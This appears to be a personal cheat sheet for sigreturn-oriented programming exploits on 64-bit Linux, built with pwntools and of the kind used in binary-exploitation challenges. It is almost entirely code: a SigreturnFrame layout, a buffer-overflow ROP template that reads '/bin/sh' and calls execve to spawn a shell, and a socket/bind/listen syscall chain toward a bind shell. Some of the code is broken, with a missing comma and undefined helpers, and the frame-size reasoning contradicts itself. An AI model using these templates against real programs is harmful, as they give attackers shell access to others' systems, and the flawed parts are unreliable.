[toc]

## FRAME

### Struct

```py
# sigFrame=SigreturnFrame()
sigFrame = flat({
    0x0:  [rt_sigreturn, uc_flags],
    0x10: [&uc, uc_stack.ss_sp],
    0x20: [uc_stack.ss.flags, uc_stack.ss_size],
    0x30: [r8, r9],
    0x40: [r10, r11],
    0x50: [r12, r13],
    0x60: [r14, r15],
    0x70: [rdi, rsi],	# rdi=&'/bin/sh\x00'
    0x80: [rbp, rbx],
    0x90: [rdx, rax],	# rax=59(execve)
    0xa0: [rcx, rsp],
    0xb0: [rip, eflags],	# rip=&syscall
    0xc0: [cs/gs/fs, err],
    0xd0: [trapno, oldmask(unused)],
    0xe0: [cr2(segfault addr), &fpstate],
    0xf0: [__reserved, sigmask],
})
```

### Size

In 64-bit Linux, the **`SigreturnFrame`** usually holds the state of the following registers:

- `r8`
- `r9`
- `r10`
- `r11`
- `r12`
- `r13`
- `r14`
- `r15`
- `rdi`
- `rsi`
- `rbp`
- `rbx`
- `rdx`
- `rax`
- `rcx`
- `rsp`
- `rip`
- `eflags`
- `cs` (code segment)
- `gs`, `fs` (segment selectors)
- `ss` (stack segment)

Each of these registers occupies 8 bytes:

```
21 registers × 8 bytes/register = 168 bytes
```

However, there are likely additional fields (such as padding, alignment, or extra fields for the signal handler context). A **typical size for the `SigreturnFrame`** in 64-bit Linux is **0xF8 (248 bytes)**.



## Templates

### Read | System

```py
rop 	        = ROP(libc)
syscall_r       = libc_base + rop.find_gadget(['syscall', 'ret'])[0]
p_rax_syscall_r = libc_base + rop.find_gadget(['pop rax', 'syscall'])[0]
bin_sh		    = libc_base+ next(libc.search(b'/bin/sh\x00'))
pa(syscall_r)
pa(bin_sh)

buf = 0xdeadbeef

# 1st sigFrame: read '/bin/sh\x00' into buf
sigFrame = SigreturnFrame()
sigFrame.rax = 0	# read()
sigFrame.rdi = 0
#sigFrame.rbp = buf+0x20	
#sigFrame.rsp = buf
sigFrame.rsi = buf	# buf
sigFrame.rdx = 0x200	# size
sigFrame.rip = syscall_r

pl = pads	# overflow

pl += flat({
    0x0 : p_rax_syscall_r,	# ret
    0x8 : 15,	# rt_sigreturn
    0x10: p_rdi_r,
    0x18: 0,	# read->fd
    0x20: syscall_r,
    0x28: sigFrame,
}, filler=b'\0')

# 2nd sigFrame: system('/bin/sh\x00')
sigFrame = SigreturnFrame()
sigFrame.rax = 59	# execve()
sigFrame.rdi = buf
sigFrame.rsi = 0x0
sigFrame.rdx = 0x0
sigFrame.rip = syscall_r

pl += flat({
    0x0:  p_rax_syscall_r,
    0x8:  15,	
    0x10: syscall_r
    0x18: sigFrame,
}, filler=b'\0')

pl += b'/bin/sh\x00'
```

### Socket

```py
rop 	        = ROP(libc)
syscall_r       = libc_base + rop.find_gadget(['syscall', 'ret'])[0]

# socket() - addr1
sigFrame=SigreturnFrame()
sigFrame.rax=41	# socket
sigFrame.rdi=[family]
sigFrame.rsi=[type]
sigFrame.rdx=[protocol]
sigFrame.rsp=addr2
sigFrame.rip=syscall_r

# bind() - addr2
sigFrame=SigreturnFrame()
sigFrame.rax=49	# bind
sigFrame.rdi=[fd]
sigFrame.rsi=[sockaddr]
sigFrame.rdx=[addrlen]
sigFrame.rsp=addr3
sigFrame.rip=syscall_r

# listen() - addr3
sigFrame=SigreturnFrame()
sigFrame.rax=50	# listen
sigFrame.rdi=[fd]
sigFrame.rsi=[backlog]
sigFrame.rsp=addr4
sigFrame.rip=syscall_r
```

